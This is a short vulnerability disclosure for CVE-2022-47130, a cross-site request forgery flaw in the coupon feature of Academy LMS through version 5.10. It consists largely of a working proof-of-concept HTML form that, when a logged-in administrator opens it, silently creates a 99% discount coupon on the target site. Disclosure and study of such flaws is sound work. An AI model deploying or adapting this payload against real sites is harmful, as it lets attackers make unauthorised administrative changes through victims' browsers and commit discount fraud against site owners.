# CVE-2022-47130
Academy LMS &lt;= 5.10 CSRF

# Description
Academy LMS is an application where people can create and advertise courses. The add a coupon feature is vulnerable to CSRF as there is no token which causes this attack to be avoided.

# Proof of Concept (POC)
The first step to our proof of concept is to authenticate to the platform with administrative user.

After that, just access the page that contains the code for exploiting the vulnerability, check it out that a new coupon was created automatically.

Code used in the exploit:

```html
<html>
   <body>
   <script>history.pushState('', '', '/')</script>
     <form action="https://target.com/admin/coupons/add" method="POST">
       <input type="hidden" name="code" value="vinix" />
       <input type="hidden" name="discount&#95;percentage" value="99" />
       <input type="hidden" name="expiry&#95;date" value="12&#47;11&#47;2022" />
       <input type="submit" value="Submit request" />
     </form>
   </body>
</html>
```
